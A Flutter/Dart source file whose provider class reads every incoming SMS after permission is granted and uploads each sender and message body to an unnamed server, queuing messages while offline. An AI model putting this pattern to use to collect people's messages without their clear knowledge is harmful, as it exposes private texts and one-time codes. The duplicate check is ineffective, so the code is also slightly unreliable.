import 'package:flutter/cupertino.dart';
import 'package:readsms/readsms.dart';
import 'package:sms/AllPermission/Permission.dart';
import 'package:sms/DataService/InternetChecker.dart';
import 'package:sms/DataService/data_services.dart';

class SmsProvider extends ChangeNotifier {
  SmsProvider() {
    init();
  }

  List onlineList = [];
  List offlineList = [];
  final _plugin = Readsms();

  Future<void> init() async {
    final value = await MyPermission.getSmsPermission();
    if (value) {
      _plugin.read();
      _plugin.smsStream.listen((event) async {
        // Check if the message is already in the list
        if (!onlineList.contains({"sender": event.sender.toString(), "body": event.body})) {
          onlineList.add({"sender": event.sender.toString(), "body": event.body});
          notifyListeners();

          // If internet is available, send messages to the server
          if (await InternetChecker().internetConnect()) {
            onlineList.removeWhere((element) {
              DataServices.SendSmsServer(element['sender'], element['body']);
              return true;
            });
            notifyListeners();

            // Send messages from offlineList if any
            if (offlineList.isNotEmpty) {
              offlineList.removeWhere((element) {
                DataServices.SendSmsServer(element['sender'], element['body']);
                return true;
              });
            }
          } else {
            // If no internet, move messages to offlineList
            offlineList.addAll(onlineList);
            onlineList.clear();
          }
          notifyListeners();
        }
      });
    }
  }
}
